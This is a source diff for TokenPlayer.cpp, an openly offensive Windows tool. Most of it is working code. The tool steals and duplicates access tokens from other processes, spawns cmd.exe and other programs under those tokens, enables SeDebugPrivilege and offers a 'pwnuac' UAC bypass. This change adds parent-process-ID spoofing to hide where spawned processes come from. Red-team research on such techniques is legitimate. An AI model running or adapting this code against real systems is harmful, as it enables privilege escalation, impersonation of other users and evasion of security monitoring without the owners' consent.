@@ -1,20 +1,21 @@
 /*
-    File: TokenPlayer.cpp
-    Author: @S1ckB0y1337
-    License: MIT License
+	File: TokenPlayer.cpp
+	Author: @S1ckB0y1337
+	License: MIT License
 */
 
 #include <stdio.h>
 #include <iostream>
 #include <string>
 #include <tchar.h>
+#include <Windows.h>
 #include <Shlobj.h>
 #include <atlstr.h>
-#include <Windows.h>
 #include <process.h>
 #include <strsafe.h>
 #include <boost/program_options.hpp>
 #include "EnablePrivilege.h"
+#include "ProcessSpoofing.h"
 
 #define MAX_NAME 256
 #define BUFSIZE 4096 
@@ -38,10 +39,12 @@ int main(int argc, char* argv[]) {
 	po::options_description general_desc("General options");
 	po::options_description impersonate_desc("Impersonation Options");
 	po::options_description exec_desc("Execution Options");
-	po::options_description exec_literal("");
-	po::options_description uacbypass_literal("");
+	po::options_description exec_commands("");
 	po::options_description maketoken_desc("Make Token Options");
 	po::options_description uacbypass_desc("UAC Bypass Options");
+	po::options_description uacbypass_commands("");
+	po::options_description ppid_spoofing_desc("Parent Process Spoofing Options");
+	po::options_description ppid_spoofing_commands("");
 	//General menu options
 	general_desc.add_options() ("help", "Display help menu.");
 	//Spawn menu options
@@ -57,7 +60,7 @@ int main(int argc, char* argv[]) {
 		("prog", "The full path to the program to be executed.")
 		("args", "Optional execution arguments for the specified program.")
 		;
-	exec_literal.add_options()
+	exec_commands.add_options()
 		("exec", "Execute an instance of a specified program.")
 		("prog", po::value <std::string>(), "The full path to the program to be executed.")
 		("args", po::value<std::string>(), "Optional execution arguments for the specified program.")
@@ -77,15 +80,27 @@ int main(int argc, char* argv[]) {
 		("args", po::value <std::string>(), "Optional execution arguments for the specified program.")
 		;
 	//UAC literal options
-	uacbypass_literal.add_options() ("pwnuac", "Will try to bypass UAC using the token-duplication method.");
+	uacbypass_commands.add_options() ("pwnuac", "Will try to bypass UAC using the token-duplication method.");
+	//Parent Spoofing options
+	ppid_spoofing_desc.add_options()
+		("spoofppid", "Spawn a new instance of an application with spoofed parent process.")
+		("ppid", po::value<DWORD>(), "The PID of the parent process.")
+		("prog", po::value <std::string>(), "The full path to the program to be executed.")
+		("args", po::value <std::string>(), "Optional execution arguments for the specified program.")
+		;
+	//Parent Spoofing commands
+	ppid_spoofing_commands.add_options()
+		("spoofppid", "Specify the PID of the parent process you want to spoof.")
+		("ppid", po::value<DWORD>(), "The PID of the parent process.")
+		;
 	//Next we will merge them for the help menu
 	// Declare an options description instance which will include
 	// all the options
 	po::options_description all("Usage");
-	all.add(general_desc).add(impersonate_desc).add(exec_desc).add(maketoken_desc).add(uacbypass_desc);
+	all.add(general_desc).add(impersonate_desc).add(exec_desc).add(maketoken_desc).add(uacbypass_desc).add(ppid_spoofing_desc);
 	//Make another options list to store the same settings but without the duplicate pid argument
 	po::options_description all_literal("");
-	all_literal.add(general_desc).add(impersonate_desc).add(exec_literal).add(maketoken_desc).add(uacbypass_literal);
+	all_literal.add(general_desc).add(impersonate_desc).add(exec_commands).add(maketoken_desc).add(uacbypass_commands).add(ppid_spoofing_commands);
 	//Next lets create a map for the arguments
 	po::variables_map vm;
 	po::store(parse_command_line(argc, argv, all_literal), vm);
@@ -148,6 +163,18 @@ int main(int argc, char* argv[]) {
 		bypassUAC(true);
 	} else if (vm.count("pwnuac")) {
 		bypassUAC(false);
+	} else if (vm.count("spoofppid") && vm.count("ppid") && vm.count("prog") && vm.count("args")) {
+		if (IsUserAnAdmin()) {
+			EnablePrivilege(L"SeDebugPrivilege");
+		}
+		spoofParent(vm["ppid"].as<DWORD>(), const_cast<char*>(vm["prog"].as<std::string>().c_str()), const_cast<char*>(vm["args"].as<std::string>().c_str()));
+	} else if (vm.count("spoofppid") && vm.count("ppid") && vm.count("prog")) {
+		if (IsUserAnAdmin()) {
+			EnablePrivilege(L"SeDebugPrivilege");
+		}
+		spoofParent(vm["ppid"].as<DWORD>(), const_cast<char*>(vm["prog"].as<std::string>().c_str()), NULL);
+	} else if (vm.count("spoofppid") && vm.count("ppid") || vm.count("spoofppid")) {
+		std::cout << ppid_spoofing_desc << std::endl;
 	} else {
 		printf("[-]Unknown Command\n");
 		ExitProcess(1);
@@ -164,7 +191,7 @@ void contextCheck() {
 	}
 	printf("[*]Enabling SeDebugPrivilege\n");
 	//Lets enable the SeDebugPrivilege
-	if (!EnablePrivilege(stringToLPWSTR(std::string("SeDebugPrivilege")))) {
+	if (!EnablePrivilege(L"SeDebugPrivilege")) {
 		printf("[-]Couldn't enable SeDebugPrivilege\nExiting...\n");
 		ExitProcess(-1);
 	} else {
@@ -196,7 +223,7 @@ LPWSTR stringToLPWSTR(const std::string& instr) {
 HANDLE stealToken(DWORD pid) {
 	//Lets open the process of the specified PID
 	printf("[+]Target PID: %d\n", pid);
-	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
 	if (hProcess == NULL) {
 		printf("OpenProcess() error : % u\n", GetLastError());
 		ExitProcess(-1);
@@ -230,8 +257,6 @@ void spawn(HANDLE hToken, BOOL isRestricted) {
 	SecureZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
 	//Setting the size of the info structure
 	startupInfo.cb = sizeof(STARTUPINFO);
-	//Just in case we try to enable SeImpersonatePrivilege
-	EnablePrivilege(stringToLPWSTR(std::string("SeImpersonatePrivilege")));
 	//Last thing we will create a new process using the duplicated token
 	if (!isRestricted) {
 		if (CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo, &processInformation) == 0) {
@@ -251,7 +276,7 @@ void spawn(HANDLE hToken, BOOL isRestricted) {
 		}
 		printf("[+]CreateProcessWithLogonW() succeed!\n");
 	}
-	printf("[+]Proccess spawned\n");
+	printf("[+]Proccess spawned with PID: %d\n", processInformation.dwProcessId);
 	CloseHandle(hToken);
 }
 
@@ -265,8 +290,6 @@ void spawn(HANDLE hToken, LPCWSTR prog, LPWSTR args, BOOL isRestricted) {
 	//Setting the size of the info structure
 	startupInfo.cb = sizeof(STARTUPINFO);
 	//Last thing we will create a new process using the duplicated token
-	//Just in case we try to enable SeImpersonatePrivilege
-	EnablePrivilege(stringToLPWSTR(std::string("SeImpersonatePrivilege")));
 	if (!isRestricted) {
 		if (CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, prog, args, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation) == 0) {
 			printf("CreateProcessWithTokenW() error : % u\n", GetLastError());
@@ -285,7 +308,7 @@ void spawn(HANDLE hToken, LPCWSTR prog, LPWSTR args, BOOL isRestricted) {
 		}
 		printf("[+]CreateProcessWithLogonW() succeed!\n");
 	}
-	printf("[+]Proccess spawned\n");
+	printf("[+]Proccess spawned with PID: %d\n", processInformation.dwProcessId);
 	CloseHandle(hToken);
 	CloseHandle(processInformation.hProcess);
 	CloseHandle(processInformation.hThread);
@@ -340,8 +363,6 @@ void redirectChildToParent(HANDLE hToken, BOOL isRestricted) {
 	startupInfo.wShowWindow = SW_HIDE;
 	startupInfo.hStdInput = childInRead;
 	startupInfo.hStdOutput = childOutWrite;
-	//Just in case we try to enable SeImpersonatePrivilege
-	EnablePrivilege(stringToLPWSTR(std::string("SeImpersonatePrivilege")));
 	//Last thing we will create a new process using the duplicated token
 	if (!isRestricted) {
 		if (CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation) == 0) {
@@ -360,7 +381,7 @@ void redirectChildToParent(HANDLE hToken, BOOL isRestricted) {
 		}
 	}
 	printf("[+]CreateProcessWithTokenW() succeed!\n");
-	printf("[+]Proccess spawned\n");
+	printf("[+]Proccess spawned with PID: %d\n", processInformation.dwProcessId);
 	//Closing all the handles after we are done
 	CloseHandle(hToken);
 	CloseHandle(childInRead);
